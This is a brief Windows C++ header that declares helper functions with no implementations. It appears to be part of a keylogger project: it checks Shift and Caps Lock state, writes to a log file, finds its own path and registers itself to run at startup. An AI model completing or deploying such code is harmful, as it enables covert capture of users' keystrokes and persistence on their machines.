
#ifndef _FUNCTIONS_H
#define _FUNCTIONS_H

#include <fstream>
#include <string>

#include <windows.h>
#include <stdlib.h>


using namespace std;

string intToString(int);
string getCurrDir();
string getSelfPath();
string dirBasename(string);
bool isCapsLock();
bool isShift();
void logFile(ofstream&, string);
BOOL registerStartup(PCWSTR, PCWSTR, PCWSTR);
void registerProgram();

#endif /* _FUNCTIONS_H */
